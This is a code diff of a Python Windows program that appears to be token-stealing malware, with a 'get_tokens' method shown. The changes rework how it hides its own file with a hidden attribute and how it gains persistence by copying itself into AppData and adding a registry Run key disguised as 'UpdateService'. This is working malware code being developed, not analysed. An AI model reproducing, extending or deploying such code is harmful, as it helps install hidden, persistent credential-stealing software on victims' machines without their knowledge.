@@ -24,7 +24,8 @@ config = {
 
 class main():
 	def __init__(self):
-		if config['Hide_self'] and sys.argv[0] == f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{os.path.basename(__file__)}': ctypes.windll.kernel32.SetFileAttributesW(os.path.basename(__file__), 0x02)
+		self.filename = os.path.basename(__file__).replace('.py', '.exe')
+		if config['Hide_self'] and sys.argv[0] == f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{self.filename}': ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 0x02)
 
 		self.tempfolder = os.path.join(os.getenv("TEMP"),''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
 		os.mkdir(self.tempfolder)
@@ -105,13 +106,11 @@ class main():
 			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
 
 	def startup(self):
-		file = os.path.basename(__file__)
 		try: self.system("powershell Get-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name UpdateService")
 		except:
-			try: os.mkdir(f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp")
-			except: pass
-			shutil.copyfile(sys.argv[0], f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{file}')
-			self.system(f"powershell New-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{file}' -PropertyType STRING")
+			os.mkdir(f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService")
+			shutil.copytree(os.getcwd(), f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService/{self.filename}')
+			self.system(f"powershell New-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService/{self.filename}' -PropertyType STRING")
 		
 
 	def get_tokens(self, path):
